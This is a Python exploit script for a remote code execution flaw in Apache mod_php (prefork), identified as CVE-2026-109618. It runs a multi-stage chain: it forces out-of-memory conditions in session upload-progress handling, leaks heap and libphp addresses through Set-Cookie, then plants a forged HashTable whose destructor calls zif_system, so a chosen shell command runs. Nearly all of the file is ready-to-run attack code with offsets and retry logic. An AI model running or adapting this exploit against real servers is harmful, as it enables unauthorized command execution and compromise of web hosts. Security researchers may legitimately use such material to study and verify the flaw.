#!/usr/bin/env python3
"""php2shell — CVE-2026-109618 remote exploit (Apache mod_php prefork).

Chain:
  S0 rotate worker -> S1 heap base leak (Set-Cookie) -> S2 libphp base leak
  (zval_ptr_dtor pointer) -> S3 fake HashTable over PS(http_session_vars),
  pDestructor=zif_system -> command execution at session teardown.

Target requirements:
  - Apache mod_php, prefork, single worker (StartServers=1, MaxRequestWorkers=1)
  - memory_limit below the OOM field size (default 12MB vs 8M)
  - post_max_size above the OOM field size (e.g. 32M)
  - max_input_vars = 1000 (grooming depends on this)
  - display_errors = On (fatal page needed by stage 1/2 response handling)
  - session.upload_progress.enabled = On, session.use_strict_mode = Off

Usage:
  python3 poc.py -u http://TARGET/index.php -c 'id>px.php' --fetch /px.php

Offsets are libphp-relative; measured for php:8.4.26-apache:
  zif_system=0x465370  zval_ptr_dtor=0x65eb60
Other builds: pass --zif-offset/--dtor-offset or a offsets.env file.
"""
import argparse
import os
import re
import socket
import struct
import sys
import time
import urllib.parse
from collections import Counter

ZIF_OFFSET = 0x465370
DTOR_OFFSET = 0x65EB60
HTDATA_OFFSET = 0x690D8
MAX_CMD = 14

STAGE1_N = 841
STAGE2_T = 406
STAGE2_V = 16
STAGE3_PADS = [(31, 31)] * 6
SID = b"attacksessionid0001"


def build_multipart(parts, boundary):
    out = bytearray()
    for p in parts:
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + p["name"].encode() + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


class Target:
    def __init__(self, url, timeout=30.0):
        u = urllib.parse.urlsplit(url)
        if u.scheme != "http":
            raise ValueError("http:// only")
        self.host = u.hostname
        self.port = u.port or 80
        self.path = u.path or "/"
        self.timeout = timeout

    def post(self, body, boundary, read_cap=1 << 20, timeout=None, cookie=None):
        extra = f"Cookie: {cookie}\r\n" if cookie else ""
        hdr = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"{extra}"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n\r\n"
        ).encode()
        s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        s.settimeout(timeout or self.timeout)
        data = bytearray()

        def reader():
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data.extend(chunk)
            except OSError:
                pass

        import threading
        t = threading.Thread(target=reader, daemon=True)
        t.start()
        try:
            s.sendall(hdr)
            for off in range(0, len(body), 262144):
                s.sendall(body[off:off + 262144])
        except OSError:
            pass
        t.join(timeout=(timeout or self.timeout) + 1.0)
        s.close()
        return bytes(data)

    def get(self, path):
        hdr = (
            f"GET {path} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
            "Connection: close\r\n\r\n"
        ).encode()
        s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        s.sendall(hdr)
        data = bytearray()
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                data += chunk
        except OSError:
            pass
        s.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), body


def parse_cookie(resp):
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))


def chunk_base_from_cookie(raw):
    if len(raw) < 1000:
        return 0
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0


def libphp_base_from_cookie(raw, dtor_offset):
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x7F0000000000 <= p < 0x800000000000):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0


class Exploit:
    def __init__(self, target, cmd, zif_offset, dtor_offset, htdata_offset,
                 huge_mb=12):
        self.t = target
        self.cmd = cmd.encode()
        self.zif = zif_offset
        self.dtor = dtor_offset
        self.htdata = htdata_offset
        self.huge_mb = huge_mb

    def _oom_request(self, prefix_parts):
        parts = list(prefix_parts)
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            {"name": "f", "filename": "a.txt", "data": b"A" * 64},
            {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)},
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)

    def rotate(self):
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
        self._oom_request(parts)
        time.sleep(0.3)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        self.t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345",
                    read_cap=65536, timeout=20.0)
        time.sleep(0.5)

    def stage1(self):
        self._oom_request([{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)])
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(STAGE1_N):
            parts.append({"name": str(1000 + i),
                          "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})
        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                           read_cap=9 << 20)
        return chunk_base_from_cookie(parse_cookie(resp))

    def stage2(self):
        self._oom_request([{"name": f"f{i:04d}"[:5], "data": b"x" * 39}
                           for i in range(1001)])
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(983):
            for j in range(STAGE2_V if i == STAGE2_T else 1):
                parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * STAGE2_V})
        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                           read_cap=1 << 20)
        return libphp_base_from_cookie(parse_cookie(resp), self.dtor)

    def _fake_payload(self, htdata, zif):
        cmd = self.cmd
        if len(cmd) > MAX_CMD:
            raise ValueError(f"cmd max {MAX_CMD} bytes (use sh</path/c)")
        ht = bytearray(b"\x00" * 167)
        struct.pack_into("<II", ht, 0x00, 1, 7)
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
        struct.pack_into("<II", ht, 0x18, 1, 1)
        struct.pack_into("<II", ht, 0x20, 8, 0)
        struct.pack_into("<Q", ht, 0x28, 0)
        struct.pack_into("<Q", ht, 0x30, zif)
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x00, 0)
        struct.pack_into("<Q", ht, E + 0x08, 0)
        struct.pack_into("<Q", ht, E + 0x10, zif)
        struct.pack_into("<Q", ht, E + 0x18, 0)
        struct.pack_into("<Q", ht, E + 0x20, 0)
        struct.pack_into("<I", ht, E + 0x28, 0)
        struct.pack_into("<I", ht, E + 0x2C, 1)
        struct.pack_into("<Q", ht, E + 0x30, 0)
        struct.pack_into("<Q", ht, E + 0x38, 0)
        struct.pack_into("<I", ht, E + 0x40, 0)
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
        struct.pack_into("<I", ht, E + 0x58, 6)
        struct.pack_into("<II", ht, 0x80, 1, 0x106)
        struct.pack_into("<Q", ht, 0x88, 0)
        struct.pack_into("<Q", ht, 0x90, len(cmd))
        ht[0x98:0x98 + len(cmd)] = cmd
        ht[0x98 + len(cmd)] = 0

        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)
        struct.pack_into("<Q", ref, 0x18, htdata)
        struct.pack_into("<Q", ref, 0x20, 0x307)
        struct.pack_into("<Q", ref, 0x28, 0)
        return bytes(ht), bytes(ref)

    def stage3(self, htdata, zif):
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        for i, (nl, vl) in enumerate(STAGE3_PADS):
            parts.append({"name": (f"p{i:0{nl - 1}d}")[:nl], "data": b"V" * vl})
        self._oom_request(parts)
        time.sleep(0.3)

        ht, ref = self._fake_payload(htdata, zif)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
        for i in range(2):
            parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
        parts.append({"name": "g00", "data": carrier})
        for i in range(15):
            parts.append({"name": f"a{i:030d}"[:31], "data": ht})
        self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                    read_cap=65536, timeout=30.0)


def main():
    ap = argparse.ArgumentParser(description="CVE-2026-109618 exploit")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-c", "--cmd", default="id>/out/p1")
    ap.add_argument("--fetch", default="", help="GET this path for proof output")
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), default=ZIF_OFFSET)
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), default=DTOR_OFFSET)
    ap.add_argument("--htdata-offset", type=lambda x: int(x, 0), default=HTDATA_OFFSET)
    ap.add_argument("--huge-mb", type=int, default=12)
    ap.add_argument("--retries", type=int, default=3)
    ap.add_argument("--timeout", type=float, default=30.0)
    args = ap.parse_args()

    t = Target(args.url, timeout=args.timeout)
    ex = Exploit(t, args.cmd, args.zif_offset, args.dtor_offset,
                 args.htdata_offset, args.huge_mb)
    print(f"[*] target {args.url} cmd={args.cmd!r}")
    print(f"[*] zif=0x{args.zif_offset:x} dtor=0x{args.dtor_offset:x}")

    ex.rotate()

    chunk = 0
    for attempt in range(1, args.retries + 1):
        print(f"[*] stage 1 heap leak ({attempt}/{args.retries})")
        chunk = ex.stage1()
        if chunk:
            print(f"[+] chunk base = 0x{chunk:x}")
            break
        ex.rotate()
    if not chunk:
        print("HEAP_LEAK_FAILED", file=sys.stderr)
        return 1
    ex.rotate()

    libphp = 0
    for attempt in range(1, args.retries + 1):
        print(f"[*] stage 2 libphp leak ({attempt}/{args.retries})")
        libphp = ex.stage2()
        if libphp:
            print(f"[+] libphp base = 0x{libphp:x}")
            break
        ex.rotate()
    if not libphp:
        print("LIBPHP_LEAK_FAILED", file=sys.stderr)
        return 1
    ex.rotate()

    htdata = chunk + args.htdata_offset
    zif = libphp + args.zif_offset
    print(f"[*] stage 3: htdata=0x{htdata:x} zif=0x{zif:x}")

    for attempt in range(1, args.retries + 3):
        try:
            ex.stage3(htdata, zif)
        except OSError as e:
            print(f"[-] request error: {e}")
        time.sleep(0.8)
        if args.fetch:
            status, body = t.get(args.fetch)
            if status == 200 and body:
                print(f"[+] exec on attempt {attempt}")
                print(f"PROOF: {body.decode('latin1').strip()}")
                return 0
        print(f"[-] attempt {attempt} no proof")
        ex.rotate()
    print("EXPLOIT_FAILED (command may have executed blind)", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
